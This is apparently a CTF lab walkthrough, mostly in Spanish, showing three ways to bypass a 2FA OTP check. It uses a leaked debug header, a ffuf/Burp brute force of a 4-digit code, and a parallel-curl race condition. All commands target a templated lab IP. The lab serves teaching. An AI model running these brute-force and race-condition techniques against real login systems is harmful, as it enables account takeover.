Easy — Filtrado del OTP en cabecera y código fuente

El servidor incluye el código OTP en la cabecera de respuesta X-Debug-OTP y en un comentario HTML (misconfiguration de debug).

  1. Inicia sesión con cualquier usuario válido (p.ej. admin / password1).
  2. En la página de verificación, abre DevTools → Network → selecciona la petición GET /2fa/verify.
  3. En la pestaña Headers busca X-Debug-OTP: XXXXXX.
  4. Alternativamente: View Source → busca <!-- DEBUG: otp= -->.
  5. Introduce el código y obtén la flag.
curl -v http://{{ target_ip }}/2fa/verify -b "session=TU_COOKIE" 2>&1 | grep X-Debug

Medium — Brute force (4 dígitos, sin rate limiting)

El OTP es de 4 dígitos (0000–9999) y no hay control de intentos. Burp Suite Intruder lo rompe en segundos.

  1. Inicia sesión y llega a la pantalla de verificación.
  2. Intercepta la petición POST /2fa/verify en Burp Suite y envíala al Intruder.
  3. Marca el campo otp como Payload Position.
  4. Payload type: Numbers, From: 0000, To: 9999, Step: 1, Min integer digits: 4.
  5. Lanza el ataque. Filtra por longitud de respuesta diferente al error.
ffuf -u http://{{ target_ip }}/2fa/verify \
  -X POST -b "session=COOKIE" \
  -d "otp=FUZZ" \
  -w <(seq -w 0 9999) \
  -mc 200 -fs ERROR_SIZE

Hard — Race condition (TOCTOU)

El servidor hace check → sleep(80ms) → mark_used. Si dos peticiones llegan simultáneamente, ambas pasan el check antes de que ninguna marque el token.

  1. Necesitas el OTP válido: usa Easy mode para obtenerlo, luego cambia a Hard.
  2. Envía múltiples peticiones en paralelo con el mismo OTP:
# Bash — 8 peticiones simultáneas
OTP=123456
SESSION="TU_SESSION_COOKIE"
for i in $(seq 1 8); do
  curl -s -X POST http://{{ target_ip }}/2fa/verify \
    -b "session=$SESSION" \
    -d "otp=$OTP" &
done
wait

Con Burp Suite: envía la petición al Intruder con el mismo payload repetido 8 veces y en Settings → Resource Pool → Max concurrent requests: 8.

Easy — OTP leaked in response header and source

The server includes the OTP in the X-Debug-OTP response header and in an HTML comment (debug misconfiguration).

  1. Log in with any valid user (e.g. admin / password1).
  2. On the verify page, open DevTools → Network → select the GET /2fa/verify request.
  3. In the Headers tab look for X-Debug-OTP: XXXXXX.
  4. Alternatively: View Source → search for <!-- DEBUG: otp= -->.
  5. Enter the code and get the flag.
curl -v http://{{ target_ip }}/2fa/verify -b "session=YOUR_COOKIE" 2>&1 | grep X-Debug
